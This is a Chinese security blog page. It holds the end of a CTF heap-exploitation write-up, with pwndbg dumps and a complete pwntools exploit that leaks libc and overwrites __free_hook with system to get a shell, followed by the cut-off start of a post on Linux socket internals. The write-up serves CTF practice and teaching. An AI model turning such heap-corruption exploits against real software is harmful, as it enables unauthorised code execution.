<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55a466677ec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55a466677ec0</span> ◂— <span class="string">&#x27;bbbbbbbbA&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55a466677ec8</span> ◂— <span class="number">0x41</span> <span class="comment">/* &#x27;A&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55a466677ed0</span> ◂— <span class="number">0x6363636363636363</span> (<span class="string">&#x27;cccccccc&#x27;</span>)</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55a466677ed8</span> ◂— <span class="number">0xffffffff63636363</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x55a466677ee0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 这里将会被释放 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x55a466677ee8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x55a466677ef0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x55a466677ef8</span> ◂— <span class="number">0x0</span> </span><br></pre></td></tr></table></figure>
<ul>
<li><code>upload</code> 会释放 <code>ee0</code> 处的 chunk（为了不触发 unlink，必须要提前布置好 size）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5649a20ffec0</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5649a20ffec0</span> ◂— <span class="string">&#x27;bbbbbbbbA&#x27;</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5649a20ffec8</span> ◂— <span class="number">0x41</span> <span class="comment">/* &#x27;A&#x27; */</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5649a20ffed0</span> ◂— <span class="number">0x6363636363636363</span> (<span class="string">&#x27;cccccccc&#x27;</span>) <span class="comment">/* index0 */</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5649a20ffed8</span> ◂— <span class="number">0xffffffff63636363</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x5649a20ffee0</span> ◂— <span class="number">0x0</span> <span class="comment">/* 释放后留下了heap,可以用于泄露 */</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x5649a20ffee8</span> ◂— <span class="number">0x21</span> <span class="comment">/* &#x27;!&#x27; */</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x5649a20ffef0</span> —▸ <span class="number">0x5649a20ffeb0</span> ◂— <span class="number">0x0</span> <span class="comment">/* index2 */</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x5649a20ffef8</span> —▸ <span class="number">0x5649a20ee010</span> ◂— <span class="number">0x2</span></span><br></pre></td></tr></table></figure>
<ul>
<li>至于为什么 <code>ee0</code> 处会被释放，可以把上述 exp 中的 <code>edit</code> 都注释掉，然后就会发现在正常的程序流程中，<code>ee0</code> 就是一个 <code>upload chunk</code>，执行 <code>upload</code> 后这里本来就会被释放</li>
<li>其实这也是前面伪造 unsorted bin 造成的结果，程序优先从 unsorted bin 中分配 chunk，形成了一个小的 overlapping 吧，也就绕过了如下的检查：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( index &gt;= <span class="number">0</span> &amp;&amp; index &lt; chunk_num )</span><br></pre></td></tr></table></figure>
<p>后面我想用同样的思路来构造 unsorted bin 绕过该检查，但是之前遗留下来的 unsorted bin 始终会报出各种各样的错误，下面是网上其他 exp 的构造方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;r&quot;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xc1</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>) </span><br><span class="line"><span class="comment"># &#x27;p64(0xc1)&#x27;是为了跳过unsorted chunk,避免更多的麻烦</span></span><br><span class="line"><span class="comment"># &#x27;p64(1)&#x27;是为了使P位为&#x27;1&#x27;,后面有个free会检查这里</span></span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span>*<span class="number">8</span>*<span class="number">8</span> + p64(<span class="number">0</span>) + p32(<span class="number">0x1f1</span>) </span><br><span class="line"><span class="comment"># 修改unsorted chunk-&gt;size(为了后面的upload一次性把这个unsorted chunk申请掉)</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the new name:&#x27;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Enter the new score:&#x27;</span>,<span class="built_in">str</span>(-<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">upload()</span><br><span class="line">download()</span><br><span class="line">payload = <span class="string">&quot;R&quot;</span>*<span class="number">0x8</span>+p64(<span class="number">0x11e1</span>) <span class="comment"># 伪造top chunk-&gt;size,足够大就行</span></span><br><span class="line">payload += <span class="string">&quot;\x00&quot;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x4f1</span>) <span class="comment"># 把将要free的chunk-&gt;size改大(进入unsorted bin)</span></span><br><span class="line">edit(<span class="number">0</span>,payload,<span class="number">0</span>)</span><br><span class="line">upload()</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：top chunk 存储在 main_arena+96 中，当调用 free 时， [R11] 寄存器会存储该值</li>
</ul>
<p>大佬的解决办法也很简单，<code>upload</code> 会先 malloc 后 free，只要在 malloc 的时候把 unsorted chunk 给全部申请掉，后面就不用考虑 unsorted bin 的问题了，所以需要修改一下 unsorted chunk-&gt;size</p>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">libcc = cdll.LoadLibrary(<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">cmd  =<span class="string">&quot;b *$rebase(0x22C0)\n&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x22CE)\n&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x22DC)\n&quot;</span></span><br><span class="line">cmd +=<span class="string">&quot;b *$rebase(0x22EA)\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p,cmd)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span>(<span class="params">ch</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>,<span class="built_in">str</span>(ch))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">name,score</span>):</span></span><br><span class="line">    menu(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;name:&#x27;</span>,name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;scores&#x27;</span>,<span class="built_in">str</span>(score))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;return&#x27;</span>,<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    menu(<span class="number">2</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;2.Remove by index&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index,new_name,new_score</span>):</span></span><br><span class="line">    menu(<span class="number">3</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;by index&#x27;</span>,<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index?&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the new name:&#x27;</span>,new_name)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Enter the new score:&#x27;</span>,<span class="built_in">str</span>(new_score))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    menu(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download</span>():</span></span><br><span class="line">    menu(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin</span>():</span></span><br><span class="line">    seed = libcc.time(<span class="number">0</span>)</span><br><span class="line">    libcc.srand(seed)</span><br><span class="line">    key = <span class="string">&quot;n0_One_kn0w5_th15_passwd&quot;</span></span><br><span class="line">    password = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        v1 = i | <span class="built_in">ord</span>(key[i]) ^ <span class="number">0xF</span></span><br><span class="line">        password += <span class="built_in">chr</span>(libcc.rand() &amp; v1)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Password for admin:&quot;</span>, password)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_IO_str_jumps</span>():</span></span><br><span class="line">   IO_file_jumps_offset = libc.sym[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">   IO_str_underflow_offset = libc.sym[<span class="string">&#x27;_IO_str_underflow&#x27;</span>]</span><br><span class="line">   <span class="keyword">for</span> ref_offset <span class="keyword">in</span> libc.search(p64(IO_str_underflow_offset)):</span><br><span class="line">       possible_IO_str_jumps_offset = ref_offset - <span class="number">0x20</span></span><br><span class="line">       <span class="keyword">if</span> possible_IO_str_jumps_offset &gt; IO_file_jumps_offset:</span><br><span class="line">          <span class="keyword">return</span> possible_IO_str_jumps_offset</span><br><span class="line"></span><br><span class="line">admin()</span><br><span class="line"></span><br><span class="line">add(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0x421</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x18</span> + p64(<span class="number">0xf121</span>) + <span class="string">&quot;a&quot;</span> * <span class="number">0x3F8</span> + p64(<span class="number">0x11</span>) + <span class="string">&quot;a&quot;</span> * <span class="number">8</span> + p64(<span class="number">0x11</span>), <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">download()</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;2.Edit by index\n&quot;</span>, <span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Index?\n&quot;</span>, <span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Scores\n1\t&quot;</span>)</span><br><span class="line">libc_base = u64(p.recv(<span class="number">6</span>) + <span class="string">&quot;\x00&quot;</span> * <span class="number">2</span>) - <span class="number">0x1ebb80</span> - <span class="number">0x60</span></span><br><span class="line">free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">success(<span class="string">&quot;libc_base&quot;</span>, libc_base)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;name:&quot;</span>,p64(<span class="number">0</span>) + p64(<span class="number">0x111</span>))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;score:&quot;</span>, <span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line">gadget = p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x31</span>)</span><br><span class="line">upload()</span><br><span class="line">edit(<span class="number">0</span>, gadget * <span class="number">2</span> + p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x111</span>), <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">edit(<span class="number">0</span>, gadget * <span class="number">2</span> + p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x111</span>) + p64(free_hook - <span class="number">0x10</span>), <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">payload = <span class="string">&quot;/bin/sh\x00&quot;</span> * <span class="number">2</span> + p64(system_addr) * <span class="number">2</span> + p64(free_hook - <span class="number">0x10</span>) + p64(<span class="number">0x111</span>) + p64(free_hook - <span class="number">0x10</span>)</span><br><span class="line">payload += gadget * <span class="number">4</span> + p64(<span class="number">0x31</span>) + gadget</span><br><span class="line">edit(<span class="number">0</span>, payload, <span class="number">0</span>)</span><br><span class="line">upload()</span><br><span class="line">      </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">    add(<span class="string">&quot;a&quot;</span>*<span class="number">8</span>,<span class="number">0</span>)                                                       </span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)             </span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p><strong>小结：</strong></p>
<p>这个堆风水真的好难弄，自己搞了好几天才 leak 出来，但是堆风水太乱不能 get shell，最后还是只能调试网上的 exp</p>
<p>最后挂的 exp 是我遇见的最简单的了，他只 leak 了 libc_base，导致堆风水简洁了不少</p>
<p>从这个题目没有学习到什么知识，就当练习了一下堆风水吧</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">Principles：Socket底层原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-09-06 16:56:15" itemprop="dateCreated datePublished" datetime="2022-09-06T16:56:15+08:00">2022-09-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-10-01 15:16:14" itemprop="dateModified" datetime="2022-10-01T15:16:14+08:00">2022-10-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Principles/" itemprop="url" rel="index"><span itemprop="name">Principles</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>8 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Socket 基础知识</strong></p>
<p>相比于其他 IPC 方式，Socket 更牛的地方在于，它不仅仅可以做到同一台主机内跨进程通信，它还可以做到不同主机间的跨进程通信</p>
<ul>
<li>“IP+端口+协议”的组合就可以唯一标识网络中一台主机上的一个进程</li>
<li>信息依靠 <strong>操作系统和网络栈</strong> 从发送端 Socket 到接收端 Socket</li>
</ul>
<p>一个完整的 Socket 的组成应该是由<strong><code>[协议，本地地址，本地端口，远程地址，远程端口]</code></strong> 组成的一个5维数组</p>
<ul>
<li>发送端：<strong><code>[tcp，发送端IP，发送端port，接收端IP，接收端port]</code></strong></li>
<li>接收端：<strong><code>[tcp，接收端IP，接收端port，发送端IP，发送端port]</code></strong></li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641474031711-1664608572272.png" class width="1641474031711">  
<ul>
<li>函数 <code>socket</code> 用于为本进程生成一个 Socket 描述符，内核中都有一个表，保存了该进程申请并占用的所有 socket 描述符</li>
<li>服务端需要 <code>bind</code> 一个 <code>struct sockaddr</code>，其目的是为了指定一个固定的 IP/port 和地址族（因为客户端需要知道服务器基础信息才能通信）</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> &#123;</span></span><br><span class="line">    <span class="keyword">short</span> <span class="keyword">int</span> sin_family; <span class="comment">/* 地址族(底层用来递交数据的通信协议) */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> <span class="keyword">int</span> sin_port; <span class="comment">/* 端口号 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">in_addr</span> <span class="title">sin_addr</span>;</span> <span class="comment">/* Internet地址 */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> sin_zero[<span class="number">8</span>]; <span class="comment">/* 为了让sockaddr与sockaddr_in两个数据结构保持大小相同而保留的空字节 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>客户端就不需要 <code>bind</code>，而是在 <code>connect</code> 时由系统分配端口（<code>connect</code> 的参数为服务端的 <code>struct sockaddr</code>）</li>
<li>然后服务器开始监听该 port，循环执行 <code>accept</code>，并等待客户端 <code>connect</code></li>
</ul>
<p><strong>Linux 网络数据包</strong></p>
<p>网卡收包从整体上是网线中的高低电平转换到网卡 FIFO 存储，再拷贝到系统主内存的过程</p>
<p>接收数据包是一个复杂的过程，涉及很多底层的技术细节，但大致需要以下几个步骤：</p>
<ul>
<li>网卡收到数据包</li>
<li>将数据包从网卡硬件缓存转移到服务器内存中（内核缓存 <code>sk_buffer</code>）</li>
<li>通知内核处理</li>
<li>经过 TCP/IP 协议逐层处理</li>
<li>应用程序通过 <code>read</code> 从 socket buffer 读取数据</li>
</ul>
<p>这里就重点分析一下数据包传输到内核的过程：</p>
<p>NIC（Network Interface Card，网卡）在接收到数据包之后，首先需要将数据同步到内核中，具体流程如下：</p>
<ul>
<li>驱动在内存中分配一片缓冲区用来接收数据包，叫做 <code>sk_buffer</code></li>
<li>将上述缓冲区的地址和大小（即接收描述符），加入到 <code>RX ring buffer</code></li>
<li>驱动通知网卡有一个新的描述符</li>
<li>网卡从 <code>RX ring buffer</code> 中取出描述符，从而获知缓冲区的地址和大小</li>
<li>网卡收到新的数据包</li>
<li>网卡将新数据包通过 <code>DMA</code> 直接写到 <code>sk_buffer</code> 中<ul>
<li><code>RX ring buffer</code>：网络栈接收数据环形缓存区</li>
<li><code>DMA</code>：Direct Memory Access 直接存储器访问，外部设备不通过CPU而直接与系统内存交换数据的接口技术</li>
</ul>
</li>
</ul>
<p>这个时候，数据包已经被转移到了 <code>sk_buffer</code> 中，接着就会通过中断告诉内核有新数据进来了，内核会完成接下来的工作（内核会把工作交给 [网络协议栈] 去处理，以后慢慢看）</p>
<p><strong>Socket 底层原理</strong></p>
<p>其实 Socket 就是应用层与 TCP/IP 协议族通信的中间软件抽象层，它是一组接口：</p>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641473787712-1664608572272.png" class width="1641473787712"> 
<ul>
<li>Socket 可以大大简化“网络通信编程”，我们不需要完全掌握这种编程的各个细节，只需要使用 Socket 的接口就可以完成 Linux 传输网络数据包的各个步骤</li>
<li>使进程以“操作文件的方式”实现网络数据包的传输</li>
</ul>
<p>最后 Wireshark 抓个包：（133.server，134.client）</p>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1662438399161-1664608572267.png" class width="1662438399161">   
<ul>
<li>[NO.1~3]：三次握手（SYN：同步， ACK：确认）</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641475541309-1664608572272.png" class width="1641475541309"> 
<ul>
<li>[NO.4]：client -&gt; server，传输数据（PSH：传输）</li>
<li>[NO.5~8]：四次释放（FIN：结束）</li>
</ul>
<img src="/2022/09/06/Principles%EF%BC%9ASocket%E5%BA%95%E5%B1%82%E5%8E%9F%E7%90%86/1641475703919-1664608572267.png" class width="1641475703919"> 
<ul>
<li>可以发现 client 的端口是系统分配的，而 server 的端口是我们在 <code>bind</code> 中指定的</li>
</ul>
<p><strong>Linux 端口和进程的关系</strong></p>
<p>会看 client 和 server 的运行逻辑：</p>
<ul>
<li>server 监听自己系统上的一个固定端口</li>
<li>client 尝试连接 server 上的那个固定端口</li>
</ul>
<p>client 和 server 本质上是运行在 shell 上的两个进程，那它们是怎么通过端口建立联系的呢？</p>
<ul>
<li>端口是 TCP/IP 协议中的概念，描述的是 TCP 协议上的对应的应用，可以理解为基于 TCP 的系统服务，或者说系统进程（只要把某个进程运行在端口上，它就成为了 TCP 协议上的对应的应用）</li>
<li>对于每个进程，内核中都有一个表，保存了该进程申请并占用的所有 socket 描述符，在进程看来（socket 其实跟文件也没有什么不同，只不过通过描述符获得的对象不同而已，接口对应的系统调用也不同）</li>
<li>server 监听一个端口，client 连接一个端口，内核就可以通过端口快速查找并确定需要处理的进程，这两个进程就通过 TCP 协议关联起来了</li>
</ul>
<p>当 client 通过 socket 描述符向 server 发送数据后，底层的 “网卡，内核，网络协议栈” 就会用预设的方案来处理数据包，并且把数据存储到 <code>sk_buffer</code> 中</p>
<p>然后 server 就可以通过读文件的方式，把 <code>sk_buffer</code> 中的数据 <code>read/recv</code> 到本地空间中</p>
<p><strong>socket 在 Linux 中的实现</strong></p>
<p>socket 在内核中的实现分为两层：</p>
<ul>
<li>BSD socket</li>
<li>inet socket</li>
</ul>
<p>socket 在内核中对应的函数就是 <code>__sys_socket</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __sys_socket(<span class="keyword">int</span> family, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> retval;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">socket</span> *<span class="title">sock</span>;</span></span><br><span class="line">	<span class="keyword">int</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Check the SOCK_* constants for consistency.  */</span></span><br><span class="line">	BUILD_BUG_ON(SOCK_CLOEXEC != O_CLOEXEC);</span><br><span class="line">	BUILD_BUG_ON((SOCK_MAX | SOCK_TYPE_MASK) != SOCK_TYPE_MASK);</span><br><span class="line">	BUILD_BUG_ON(SOCK_CLOEXEC &amp; SOCK_TYPE_MASK);</span><br><span class="line">	BUILD_BUG_ON(SOCK_NONBLOCK &amp; SOCK_TYPE_MASK);</span><br><span class="line"></span><br><span class="line">	flags = type &amp; ~SOCK_TYPE_MASK;</span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~(SOCK_CLOEXEC | SOCK_NONBLOCK))</span><br><span class="line">		<span class="keyword">return</span> -EINVAL;</span><br><span class="line">	type &amp;= SOCK_TYPE_MASK;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (SOCK_NONBLOCK != O_NONBLOCK &amp;&amp; (flags &amp; SOCK_NONBLOCK))</span><br><span class="line">		flags = (flags &amp; ~SOCK_NONBLOCK) | O_NONBLOCK;</span><br><span class="line"></span><br><span class="line">	retval = sock_create(family, type, protocol, &amp;sock); <span class="comment">/* 创建一个struct socket */</span></span><br><span class="line">	<span class="keyword">if</span> (retval &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> retval;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> sock_map_fd(sock, flags &amp; (O_CLOEXEC | O_NONBLOCK)); <span class="comment">/* 